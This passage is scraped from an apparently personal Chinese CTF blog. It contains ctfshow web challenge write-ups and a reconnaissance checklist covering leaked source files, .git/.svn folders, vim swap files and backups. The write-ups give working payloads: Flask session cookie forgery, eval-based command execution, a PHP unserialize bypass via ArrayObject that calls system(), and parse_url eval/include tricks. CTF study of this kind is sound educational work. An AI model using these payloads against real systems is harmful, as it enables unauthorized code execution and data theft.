关键代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 def login(): msg = \u0026#39;\u0026#39; if request.method == \u0026#39;POST\u0026#39; and \u0026#39;username\u0026#39; in request.form and \u0026#39;password\u0026#39; in request.form: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and password == users[username][\u0026#39;password\u0026#39;]: session[\u0026#39;loggedin\u0026#39;] = True session[\u0026#39;username\u0026#39;] = username session[\u0026#39;role\u0026#39;] = users[username][\u0026#39;role\u0026#39;] return redirect(url_for(\u0026#39;profile\u0026#39;)) else: msg = \u0026#39;Incorrect username/password!\u0026#39; return render_template(\u0026#39;login.html\u0026#39;, msg=msg) 4.进行session伪造 1 2 3 python3 flask_session_cookie_manager3.py encode -s \u0026#39;S3cr3tK3y\u0026#39; -t \u0026#34;{\u0026#39;loggedin\u0026#39;: True, \u0026#39;role\u0026#39;: \u0026#39;admin\u0026#39;, \u0026#39;username\u0026#39;: \u0026#39;admin\u0026#39;}\u0026#34; .eJyrVsrJT09PTcnMU7IqKSpN1VEqys9JVbJSSkzJBYrpKJUWpxblJeYihGoBzOYRgA.ZDKUZA.VrSPdJ2nKesTJFDJucQqPXODP0M 5.抓包，修改cookie的session值，改为刚才伪造的值，然后返回页面 6.下载文件，发现是一个文本文件，内容为flag{fake_flag} 这个时候抓包看一下，发现文件名为fakeflag.txt，明显是愚人节愚人啦\n只能再想想还有没有忽略的点，又去看了learn链接的代码，发现了被注释的app.py\n7.下载app.py，得到源码，发现关键代码 需要get传参，但是因为源代码没有调用os库，需要payload加一下，传参之后得到flag\n这里贴一下app.py源码~\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 # app.py from flask import Flask, render_template, request, redirect, url_for, session, send_file, Response import os app = Flask(__name__) app.secret_key = \u0026#39;S3cr3tK3y\u0026#39; users = { \u0026#39;admin\u0026#39;: {\u0026#39;password\u0026#39;: \u0026#39;LKHSADSFHLA;KHLK;FSDHLK;ASFD\u0026#39;, \u0026#39;role\u0026#39;: \u0026#39;admin\u0026#39;} } @app.route(\u0026#39;/\u0026#39;) def index(): # Check if user is loggedin if \u0026#39;loggedin\u0026#39; in session: return redirect(url_for(\u0026#39;profile\u0026#39;)) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login/\u0026#39;, methods = [\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): msg = \u0026#39;\u0026#39; if request.method == \u0026#39;POST\u0026#39; and \u0026#39;username\u0026#39; in request.form and \u0026#39;password\u0026#39; in request.form: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and password == users[username][\u0026#39;password\u0026#39;]: session[\u0026#39;loggedin\u0026#39;] = True session[\u0026#39;username\u0026#39;] = username session[\u0026#39;role\u0026#39;] = users[username][\u0026#39;role\u0026#39;] return redirect(url_for(\u0026#39;profile\u0026#39;)) else: msg = \u0026#39;Incorrect username/password!\u0026#39; return render_template(\u0026#39;login2.html\u0026#39;, msg = msg) @app.route(\u0026#39;/register/\u0026#39;, methods = [\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): msg = \u0026#39;\u0026#39; if request.method == \u0026#39;POST\u0026#39; and \u0026#39;username\u0026#39; in request.form and \u0026#39;password\u0026#39; in request.form: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users: msg = \u0026#39;Account already exists!\u0026#39; else: users[username] = {\u0026#39;password\u0026#39;: password, \u0026#39;role\u0026#39;: \u0026#39;user\u0026#39;} msg = \u0026#39;You have successfully registered!\u0026#39; return render_template(\u0026#39;register2.html\u0026#39;, msg = msg) @app.route(\u0026#39;/profile/\u0026#39;) def profile(): if \u0026#39;loggedin\u0026#39; in session: return render_template(\u0026#39;profile2.html\u0026#39;, username = session[\u0026#39;username\u0026#39;], role=session[\u0026#39;role\u0026#39;]) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/show/\u0026#39;) def show(): if \u0026#39;loggedin\u0026#39; in session: return render_template(\u0026#39;show2.html\u0026#39;) @app.route(\u0026#39;/download/\u0026#39;) def download(): if \u0026#39;loggedin\u0026#39; in session: filename = request.args.get(\u0026#39;filename\u0026#39;) if \u0026#39;filename\u0026#39; in request.args: return send_file(filename, as_attachment = True) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/hello/\u0026#39;) def hello_world(): try: s = request.args.get(\u0026#39;eval\u0026#39;) return f\u0026#34;hello,{eval(s)}\u0026#34; except Exception as e: print(e) pass return \u0026#34;hello\u0026#34; @app.route(\u0026#39;/logout/\u0026#39;) def logout(): session.pop(\u0026#39;loggedin\u0026#39;, None) session.pop(\u0026#39;id\u0026#39;, None) session.pop(\u0026#39;username\u0026#39;, None) session.pop(\u0026#39;role\u0026#39;, None) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 8080) 2.payload 1 URL+/hello/?eval=__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;cat /flag_is_h3re\u0026#34;).read() easy_php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 error_reporting(0); highlight_file(__FILE__); class ctfshow{ public function __wakeup(){ die(\u0026#34;not allowed!\u0026#34;); } public function __destruct(){ system($this-\u0026gt;ctfshow); } } $data = $_GET[\u0026#39;1+1\u0026gt;2\u0026#39;]; if(!preg_match(\u0026#34;/^[Oa]:[\\d]+/i\u0026#34;, $data)){ unserialize($data); } ?\u0026gt; 1.题目分析 只要执行__destruct()中的system函数，给ctfshow赋值即可\n但是对data进行了过滤，不能传入以O和a开头的序列化值,也就是对象和数组的序列化值。\n感觉这个题的难点，就是不太会绕过Oa，\n题目中的ctfshow类未实现serializable接口，所以不能解析该属性。所以找php中内置的实现了Serializable接口的类\nwp使用了ArrayObject()类，使用这个类去修饰ctfshow类\n2.知识点 O标识符代表对象类型，而C标识符代表类名类型。如果将O替换为C，则在反序列化时会将其解释为一个新的类名字符串，从而创建一个新的类而不是对象。因为这个新的类没有被序列化过，所以它没有任何属性或方法。因此在反序列化时，__wakeup等一些魔术方法就不会被自动调用。但是可以利用有接口Serializable的类，来进行修饰，从而可以利用魔术方法。比如ArrayObject类。 1 2 3 4 5 6 7 8 O:6:\u0026#34;Person\u0026#34;:2:{s:3:\u0026#34;age\u0026#34;;i:18;s:4:\u0026#34;name\u0026#34;;s:3:\u0026#34;lxy\u0026#34;;} “O”：对象 “6”：对象的类名长度 “Person”：对象名 “2”：对象中有2个变量。 s:4:\u0026#34;name\u0026#34;;s:3:\u0026#34;lxy\u0026#34;： “s”：变量类型，为string对象；s:4:\u0026#34;name\u0026#34;：变量名长度和变量名， s:3:\u0026#34;lxy\u0026#34;：变量的值和值的长度。 在php低版本中，O或a的冒号后的数字前可以加一个+来进行绕过，题目版本7.3无法绕过。 1 2 3 4 5 6 C:11:\u0026#34;ArrayObject\u0026#34;:37:{x:i:0;a:2:{i:0;i:0;i:1;i:1;};m:a:0:{}} 37：括号内的字符数 x:i:0;：结构中的nr_flags字段 a:2:{i:0;i:0;i:1;i:1;}：结构中的数组字段(从这个角度,它被称为internal数组以区别于对象本身) m:a:0:{}：zend_object std字段内的properties字段(从这个角度,称为members数组)。 3.payload 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # payload1:官方 ?1%2b1\u0026gt;2=C:11:\u0026#34;ArrayObject\u0026#34;:67:{x:i:0;O:7:\u0026#34;ctfshow\u0026#34;:1:{s:7:\u0026#34;ctfshow\u0026#34;;s:12:\u0026#34;cat /f1agaaa\u0026#34;;};m:a:0:{}} # payload2: ?1%2b1\u0026gt;2=C:11:\u0026#34;ArrayObject\u0026#34;:87:{x:i:0;a:1:{s:7:\u0026#34;ctfshow\u0026#34;;O:7:\u0026#34;ctfshow\u0026#34;:1:{s:7:\u0026#34;ctfshow\u0026#34;;s:12:\u0026#34;cat /f1agaaa\u0026#34;;}};m:a:0:{}} class ctfshow { public $ctfshow = \u0026#39;cat /f1agaaa\u0026#39;; } $ctfshow_obj = new ctfshow(); $array_obj = new ArrayObject(); $array_obj[\u0026#39;ctfshow\u0026#39;] = $ctfshow_obj; $serialized_str = serialize($array_obj); echo $serialized_str; // C:11:\u0026#34;ArrayObject\u0026#34;:87:{x:i:0;a:1:{s:7:\u0026#34;ctfshow\u0026#34;;O:7:\u0026#34;ctfshow\u0026#34;:1:{s:7:\u0026#34;ctfshow\u0026#34;;s:12:\u0026#34;cat /f1agaaa\u0026#34;;}};m:a:0:{}} // 首先，定义了一个名为 ctfshow 的类，并在其中定义了一个名为 ctfshow 的公共属性，其值为cat /f1agaaa。然后，实例化 ctfshow 类，将其赋值给 $array_obj 对象的 ctfshow 属性。 // 注意，因为 $array_obj 是一个 ArrayObject 对象，所以需要使用数组的形式来赋值，即 $array_obj[\u0026#39;ctfshow\u0026#39;]。 // 最后，使用 serialize() 函数将 $array_obj 序列化为字符串，并将其输出。 easy_class 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 namespace ctfshow; class C{ const __REF_OFFSET_1 = 0x41; const __REF_OFFSET_2 = 0x7b; const __REF_OFFSET_3 = 0x5b; const __REF_OFFSET_4 = 0x60; const __REF_OFFSET_5 = 0x30; const __REF_OFFSET_6 = 0x5f; const __REF_SIZE__= 20; const __REF_VAL_SIZE__= 50; private $cursor=0; private $cache; private $ref_table=[]; function main(){ $flag = md5(file_get_contents(\u0026#34;/flag\u0026#34;)); $this-\u0026gt;define(\u0026#39;ctfshow\u0026#39;,self::__REF_VAL_SIZE__); $this-\u0026gt;define(\u0026#39;flag\u0026#39;,strlen($flag)); $this-\u0026gt;neaten(); $this-\u0026gt;fill(\u0026#39;flag\u0026#39;,$flag); $this-\u0026gt;fill(\u0026#39;ctfshow\u0026#39;,$_POST[\u0026#39;data\u0026#39;]); if($this-\u0026gt;read(\u0026#39;ctfshow\u0026#39;)===$this-\u0026gt;read(\u0026#39;flag\u0026#39;)){ echo $flag; } } private function fill($ref,$val){ rewind($this-\u0026gt;cache); fseek($this-\u0026gt;cache, $this-\u0026gt;ref_table[$ref]+23); $arr = str_split($val); foreach ($arr as $s) { fwrite($this-\u0026gt;cache, pack(\u0026#34;C\u0026#34;,ord($s))); } for ($i=sizeof($arr); $i \u0026lt; self::__REF_VAL_SIZE__; $i++) { fwrite($this-\u0026gt;cache, pack(\u0026#34;C\u0026#34;,\u0026#34;\\x00\u0026#34;)); } $this-\u0026gt;cursor= ftell($this-\u0026gt;cache); } public static function clear($var){ ; } private function neaten(){ $this-\u0026gt;ref_table[\u0026#39;_clear_\u0026#39;]=$this-\u0026gt;cursor; $arr = str_split(\u0026#34;_clear_\u0026#34;); foreach ($arr as $s) { $this-\u0026gt;write(ord($s),\u0026#34;C\u0026#34;); } for ($i=sizeof($arr); $i \u0026lt; self::__REF_SIZE__; $i++) { $this-\u0026gt;write(\u0026#34;\\x00\u0026#34;,\u0026#39;C\u0026#39;); } $arr = str_split(__NAMESPACE__.\u0026#34;\\C::clear\u0026#34;); foreach ($arr as $s) { $this-\u0026gt;write(ord($s),\u0026#34;C\u0026#34;); } $this-\u0026gt;write(0x36d,\u0026#39;Q\u0026#39;); $this-\u0026gt;write(0x30,\u0026#39;C\u0026#39;); for ($i=1; $i \u0026lt; self::__REF_SIZE__; $i++) { $this-\u0026gt;write(\u0026#34;\\x00\u0026#34;,\u0026#39;C\u0026#39;); } } private function readNeaten(){ rewind($this-\u0026gt;cache); fseek($this-\u0026gt;cache, $this-\u0026gt;ref_table[\u0026#39;_clear_\u0026#39;]+self::__REF_SIZE__); $f = $this-\u0026gt;truncation(fread($this-\u0026gt;cache, self::__REF_SIZE__-4)); $t = $this-\u0026gt;truncation(fread($this-\u0026gt;cache, self::__REF_SIZE__-12)); $p = $this-\u0026gt;truncation(fread($this-\u0026gt;cache, self::__REF_SIZE__)); call_user_func($f,$p); } private function define($ref,$size){ $this-\u0026gt;checkRef($ref); $r = str_split($ref); $this-\u0026gt;ref_table[$ref]=$this-\u0026gt;cursor; foreach ($r as $s) { $this-\u0026gt;write(ord($s),\u0026#34;C\u0026#34;); } for ($i=sizeof($r); $i \u0026lt; self::__REF_SIZE__; $i++) { $this-\u0026gt;write(\u0026#34;\\x00\u0026#34;,\u0026#39;C\u0026#39;); } fwrite($this-\u0026gt;cache,pack(\u0026#34;v\u0026#34;,$size)); fwrite($this-\u0026gt;cache,pack(\u0026#34;C\u0026#34;,0x31)); $this-\u0026gt;cursor= ftell($this-\u0026gt;cache); for ($i=0; $i \u0026lt; $size; $i++) { $this-\u0026gt;write(\u0026#34;\\x00\u0026#34;,\u0026#39;a\u0026#39;); } } private function read($ref){ if(!array_key_exists($ref,$this-\u0026gt;ref_table)){ throw new \\Exception(\u0026#34;Ref not exists!\u0026#34;, 1); } if($this-\u0026gt;ref_table[$ref]!=0){ $this-\u0026gt;seekCursor($this-\u0026gt;ref_table[$ref]); }else{ rewind($this-\u0026gt;cache); } $cref = fread($this-\u0026gt;cache, 20); $csize = unpack(\u0026#34;v\u0026#34;, fread($this-\u0026gt;cache, 2)); $usize = fread($this-\u0026gt;cache, 1); $val = fread($this-\u0026gt;cache, $csize[1]); return $this-\u0026gt;truncation($val); } private function write($val,$fmt){ $this-\u0026gt;seek(); fwrite($this-\u0026gt;cache,pack($fmt,$val)); $this-\u0026gt;cursor= ftell($this-\u0026gt;cache); } private function seek(){ rewind($this-\u0026gt;cache); fseek($this-\u0026gt;cache, $this-\u0026gt;cursor); } private function truncation($data){ return implode(array_filter(str_split($data),function($var){ return $var!==\u0026#34;\\x00\u0026#34;; })); } private function seekCursor($cursor){ rewind($this-\u0026gt;cache); fseek($this-\u0026gt;cache, $cursor); } private function checkRef($ref){ $r = str_split($ref); if(sizeof($r)\u0026gt;self::__REF_SIZE__){ throw new \\Exception(\u0026#34;Refenerce size too long!\u0026#34;, 1); } if(is_numeric($r[0]) || $this-\u0026gt;checkByte($r[0])){ throw new \\Exception(\u0026#34;Ref invalid!\u0026#34;, 1); } array_shift($r); foreach ($r as $s) { if($this-\u0026gt;checkByte($s)){ throw new \\Exception(\u0026#34;Ref invalid!\u0026#34;, 1); } } } private function checkByte($check){ if(ord($check) \u0026lt;=self::__REF_OFFSET_5 || ord($check) \u0026gt;=self::__REF_OFFSET_2 ){ return true; } if(ord($check) \u0026gt;=self::__REF_OFFSET_3 \u0026amp;\u0026amp; ord($check) \u0026lt;= self::__REF_OFFSET_4 \u0026amp;\u0026amp; ord($check) !== self::__REF_OFFSET_6){ return true; } return false; } function __construct(){ $this-\u0026gt;cache=fopen(\u0026#34;php://memory\u0026#34;,\u0026#34;wb\u0026#34;); } public function __destruct(){ $this-\u0026gt;readNeaten(); fclose($this-\u0026gt;cache); } } highlight_file(__FILE__); error_reporting(0); $c = new C; $c-\u0026gt;main(); 1.代码分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 这段代码命名空间为ctfshow，它定义了一个名为 C 的类，并且包含了一些常量和方法。 C类： 私有成员变量 $cursor：表示当前的缓冲区指针位置。 $cache 成员变量，是一个 PHP 文件句柄，用于存储和读取数据。 常量 __REF_OFFSET_1 到 __REF_OFFSET_6，值都是一个字节，用于后面的一些操作。 __REF_SIZE__ 和 __REF_VAL_SIZE__，分别表示引用的大小和值的大小。 main()方法从 /flag 文件中读取 MD5 值，并通过 define 方法定义了两个引用 ctfshow 和 flag，分别对应用户 POST 请求中的 data 和文件 MD5 值。然后它通过 fill 方法向缓冲区中填写数据。最后，通过 read 方法比较两个引用的值，如果相等就输出 flag。 define()方法检查引用的长度是否超过限制，并将引用的名称和大小写入缓冲区。然后填写一个字节的 0x31 和引用的值的大小，以及一个指向数据的指针。这个方法还会在缓冲区中分配一段空间用于存储引用的值。 fill()方法会将数据写入缓冲区，并用 0x00 填充缓冲区的剩余部分。 read()方法会读取指定引用的值，并返回。它会检查引用是否存在，并从缓冲区中读取引用的值和大小。 neaten()方法会在缓冲区中创建一个 _clear_ 的引用和一个指向 C::clear 方法的指针，它还会写入一些空字节用于对齐。 readNeaten()方法会从缓冲区中读取 _clear_ 的值，并调用 C::clear 方法。 write()方法会将指定值写入缓冲区，并更新缓冲区的指针位置。 seek()方法会将缓冲区的指针位置设置为当前的 $cursor。 truncation()方法会将字节串中的空字节去除。 checkRef()方法会检查引用的长度是否超过限制，并且检查引用的第一个字符是否为数字。如果检查失败，它会抛出一个异常。 2.payload 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import requests url = \u0026#34;http://e89d2c6d-e01e-4fef-9510-bf760aa69af6.challenge.ctf.show/\u0026#34; data = { \u0026#34;data\u0026#34;:\u0026#34;A\u0026#34;*50+\u0026#34;flag\u0026#34;+\u0026#34;\\x00\u0026#34;*19+\u0026#34;B\u0026#34;*32+\u0026#34;\\x00\u0026#34;*20+\u0026#34;system\u0026#34;+\u0026#34;\\x00\u0026#34;*18+\u0026#34;cat /f1agaaa\u0026#34;+\u0026#34;\\x00\u0026#34;*8 } response = requests.post(url=url,data=data) print(response.text) \u0026#34;A\u0026#34;*50+\u0026#34;flag\u0026#34;：A字符重复 50 次，再拼接上字符串 \u0026#34;flag\u0026#34;，满足服务器对输入数据长度的限制。 \u0026#34;\\x00\u0026#34;*19：空字符 (\\x00) 重复 19 次，这些空字符用于填充数据，使得数据长度达到要求。 \u0026#34;B\u0026#34;*32：B字符重复 32 次，满足输入长度的限制。 \u0026#34;\\x00\u0026#34;*20：空字符重复 20 次。 \u0026#34;system\u0026#34;：表示需要执行系统命令。 \u0026#34;\\x00\u0026#34;*18：空字符重复 18 次。 \u0026#34;cat /f1agaaa\u0026#34;：需要执行的系统命令，即读取 /f1agaaa 文件的内容。 \u0026#34;\\x00\u0026#34;*8：加上 8 个空字符填充数据。 构造一个长度符合要求的字符串，将其中的部分内容作为系统命令进行执行，从而获取flag。 ","date":"2023-05-29T13:02:16+08:00","permalink":"https://relish1one.github.io/p/ctfshow-%E6%84%9A%E4%BA%BA%E6%9D%AF-web/","title":"ctfshow-愚人杯-web"},{"content":"​\t建立这个分类，初衷大概就是希望自己可以坚持热爱文学，热爱阅读，坚持输出。\n​\t保持热爱，享受孤独，人间自有鲜花救赎。\n","date":"2023-05-18T11:04:59+08:00","permalink":"https://relish1one.github.io/p/%E4%BF%9D%E6%8C%81%E7%83%AD%E7%88%B1%E4%BA%AB%E5%8F%97%E5%AD%A4%E7%8B%AC/","title":"保持热爱，享受孤独"},{"content":"信息收集 1.直接查看源代码 开发注释未删除\n2.js前台拦截 === 无效操作，需要绕过 通过在url头部添加 view-source:，更换协议 更多工具，开发者工具，查看元素 直接ctrl+u就能看到源码 更多工具，开发者工具，查看网络response ctrl+shift+i 3.burpsuite或network抓包 开发者工具，network抓包，查看hearders bp发包后查看返回包的内容 4.robots漏洞 直接访问url/robots.txt\nrobots协议，又称为爬虫协议，网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取。\nrobots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。\n5.phps文件泄露 phps存放着php源码,可通过尝试访问/index.phps读取,或者扫描工具扫描\nphps和http服务器解析后缀有关，phps文件就是php源代码文件\n6.代码泄露（网站备份压缩文件漏洞） 成因：网站修改时，存有备份文件，访问备份文件不需要权限，可以直接被下载，并且可以被任意使用修改 可能的后缀名：.rar .zip .7z .tar.gz .bak .swp .txt，例如www.zip 常见源码包名字，www.zip 需要注意，源码包有某个文件，只能说明服务器有这个文件，真正的文件具体内容，还要返回到网站去访问该目录 7\u0026amp;8.git代码泄露\u0026amp;svn泄露 提示：涉及版本控制 版本控制：管理多人协同开发项目，管理开发过程中对代码或者文件的修改记录，备份以备恢复 常用的版本控制工具git，svn，访问.git和.svn Git：分布式版本控制系统 git代码泄露 url/.git/ SVN：集中式版本控制系统 信息svn泄露 url/.svn/ 成因：.开头的文件夹在linux下，属于隐藏文件夹，终端看不到这个隐藏文件夹，有可能错误的部署到网站根目录，造成开发信息泄露或者版本的源码泄露 9.vim缓存泄露源码 vim：文本编辑器，可用来写代码\n利用vim编辑的时候，会创建临时文件，如果程序正常退出，则临时的缓存文件会自动删除，意外退出则会保留\n以 index.php 为例，第一次产生的缓存文件 .index.php.swp\n第二次.index.php.swo\n第三次.index.php.swn\n注意：index前有 \u0026quot; . \u0026quot;\n10.cookie泄露信息 F12，右键刷新，application看到cookie\n直接抓包，看到cookie内容\nHackBar，解码，ENCODING，urldecode\n11.域名TXT记录 域名解析查询的两个网址\nhttp://dbcha.com/?t=1673008254\nhttps://zijian.aliyun.com/\n12.注意网页本身小细节 管理员地址/admin/ web12，先按照信息收集的考点，搜集有用信息，robots.txt文件，结合网页，看到了一串数字，类似电话号码，就是管理员密码 现实渗透一些密码往往是常见的电话数字什么的 13.技术文档泄露后台地址和密码 注意观察网站的细节，得到一个系统开发手册或者技术文档\nyour-domain 指的是我的网域\n因为在开发一个网站的时候，你也不清楚具体使用这个网站的域名是什么，所以后台默认地址出现your-domain的时候，直接把前面换成自己的url\n比如web13，提供的后台默认网址http://your-domain/system1103/login.php，需要将system之前的，换成靶场网址\n14.编辑器目录遍历漏洞 编辑器editor，每个编辑器会带有后台和数据库，存在上传漏洞，逻辑漏洞，横向越权等 HTML5支持的内容越来越丰富，编辑器使用逐渐减少 编辑器的文件上传，文件空间有默认配置，如果浏览或访问服务器不存在的目录，会出现根目录所有内容 此处要注意找到有用文件的时候，目录的绝对路径 15.公开的信息造成信息泄露 需要注意公开的QQ邮箱，电话号码，QQ等信息，发现别的隐私信息 利用曲线救国的思想，多联想 16.php探针 php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。\n常用PHP探针：雅黑php探针，可以通过tz.php访问\n然后在访问探针页面以后，可以查看搜集对自己有用的信息\nphpinfo是php自带函数，可以显示php服务器环境的配置信息\n注意phpinfo的环境变量，其中web16就是存在环境变量FLAG，拿到flag\n17.SQL备份文件泄露 sql备份文件一般为backup.sql\n17.CDN绕过查找真实ip ping一下查看IP地址，出现多个IP即启用CDN服务\nCDN 的全称是 Content Delivery Network，即内容分发网络，CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。\n传统访问：用户访问域名–\u0026gt;解析服务器IP–\u0026gt;访问目标主机\n普通CDN：用户访问域名–\u0026gt;CDN节点–\u0026gt;真实服务器IP–\u0026gt;访问目标主机\n带WAF（web应用防护系统或web应用防火墙）的CDN：用户访问域名–\u0026gt;CDN节点（WAF）–\u0026gt;真实服务器IP–\u0026gt;访问目标主机\n可以www.ctfshow.com进行ping一下，也可以试一下ctfshow.com获取真实ip，也可以在百度找一些可以查询的网站\n18.Unicode编码解码\u0026amp;alert函数 Unicode编码，比如web18中js文件中出现的\\u4f60\\u8d62\\u4e86\\uff0c\\u53bb\\u5e7a\\u5e7a\\u96f6\\u70b9\\u76ae\\u7231\\u5403\\u76ae\\u770b\\u770b →你赢了，去幺幺零点皮爱吃皮看看 Unicode解码平台http://www.bt.cn/tools/unicode.html Unicode是一种字符编码方案，它为每种语言中的每个字符都设定了统一唯一的二进制编码，以实现跨语言、跨平台进行文本转换、处理的要求。 因为web18的Unicode编码是在js文件中，也可以不用解码，直接控制台（console）利用alert函数 Alert的功能是弹出对话框并显示其中的内容 19.前端源代码泄露密钥（AES加密） post传参：绕过前端js，直接提交哈希 HackBar，postdata，刷新，此时注意变量名称\nAES解密（密文推明文）：解密成功后，直接前端用户登入\nAES是高级加密标准，在密码学中又称Rijndael加密法，是美国联邦政府采用的一种区块加密标准。AES有着密钥，填充，向量三部分来解密加密\nAES加密解密在线工具\nhttps://tool.lmeee.com/jiami/aes\nhttps://the-x.cn/cryptography/Aes.aspx\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function checkForm(){ var key = \u0026#34;0000000372619038\u0026#34;; // 密钥 var iv = \u0026#34;ilove36dverymuch\u0026#34;; // 向量 var pazzword = $(\u0026#34;#pazzword\u0026#34;).val(); pazzword = encrypt(pazzword,key,iv); $(\u0026#34;#pazzword\u0026#34;).val(pazzword); $(\u0026#34;#loginForm\u0026#34;).submit(); } function encrypt(data,key,iv) { //key,iv：16位的字符串 var key1 = CryptoJS.enc.Latin1.parse(key); var iv1 = CryptoJS.enc.Latin1.parse(iv); return CryptoJS.AES.encrypt(data, key1,{ iv : iv1, mode : CryptoJS.mode.CBC, // 模式 padding : CryptoJS.pad.ZeroPadding // 填充 }).toString(); } \u0026lt;/script\u0026gt; 20.mdb文件泄露 mdb文件是早期asp+access构架的数据库文件，mdb格式的数据库是一种关系数据库。\n直接查看url路径添加/db/db.mdb\n数据库专门的查看工具，这里可以不下载老版本工具，直接用微软的Access查看需要的地址或者信息，依次查看各个表\n","date":"2023-05-18T10:26:52+08:00","permalink":"https://relish1one.github.io/p/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"信息收集"},{"content":"每周大挑战——PARSE_URL parse_url()函数 此函数返回一个关联数组，包含现有 URL 的各种组成部分。\n如果缺少了其中的某一个，则不会为这个组成部分创建数组项。\n对严重不合格的 URL，parse_url() 可能会返回 FALSE （CTF常用 返回值False 用于逃逸判断）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 parse_url — 解析 URL，返回其组成部分 print_r(parse_url(\u0026#39;http://username:password@127.0.0.1:8080/index.php?id=1#abc\u0026#39;)); 输出为: Array ( [scheme] =\u0026gt; http [host] =\u0026gt; 127.0.0.1 [port] =\u0026gt; 8080 [user] =\u0026gt; username [pass] =\u0026gt; password [path] =\u0026gt; /index.php [query] =\u0026gt; id=1 [fragment] =\u0026gt; abc ) 第一关 1 2 3 $data = parse_url($_GET[\u0026#39;u\u0026#39;]); eval($data[\u0026#39;host\u0026#39;]); 题目分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php $data = parse_url(\u0026#34;http://system(\u0026#39;ls /\u0026#39;);\u0026#34;); echo \u0026#34;host: \u0026#34;.$data[\u0026#39;host\u0026#39;].\u0026#34;\\n\u0026#34;; echo \u0026#34;path: \u0026#34;.$data[\u0026#39;path\u0026#39;]; ?\u0026gt; // 输出 host: system(\u0026#39;ls path: /\u0026#39;); 因为parse函数把/后面的内容自动作为path的内容，所以需要将/替换掉，可以利用参数逃逸 payload 1 2 3 4 5 6 7 8 9 ?u=http://eval($_GET[1]);\u0026amp;1=system(\u0026#34;ls /\u0026#34;); ?u=http://eval($_GET[1]);\u0026amp;1=system(\u0026#34;tac /flag_is_here.txt\u0026#34;); ?u=http://eval($_POST[1]); POST: 1=system(\u0026#34;ls /\u0026#34;); 1=system(\u0026#34;tac /flag_is_here.txt\u0026#34;); /?u=aa://eval(base64_decode(\u0026#39;c3lzdGVtKCJscyAvIik7\u0026#39;));/aaa /?u=aa://eval(base64_decode(\u0026#39;c3lzdGVtKCJjYXQgL2ZsYWdfaXNfaGVyZS50eHQiKTs=\u0026#39;));/aaa 第二关 1 2 3 $data = parse_url($_GET[\u0026#39;u\u0026#39;]); include $data[\u0026#39;host\u0026#39;].$data[\u0026#39;path\u0026#39;]; 题目分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 在 data 后面有两个冒号，因为最后一个冒号会被当做端口前的那个冒号，所以需要多打一个冒号才能让 host=data: path 在识别的时候会被带上前面的 /, 所以只用再加一个就能构造了 \u0026lt;?php $data = parse_url(\u0026#34;http://data:1//text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==\u0026#34;); print_r($data); echo $data[\u0026#39;host\u0026#39;].$data[\u0026#39;path\u0026#39;]; ?\u0026gt; 输出结果： Array ( [scheme] =\u0026gt; http [host] =\u0026gt; data [port] =\u0026gt; 1 [path] =\u0026gt; //text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== ) data//text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== \u0026lt;?php $data = 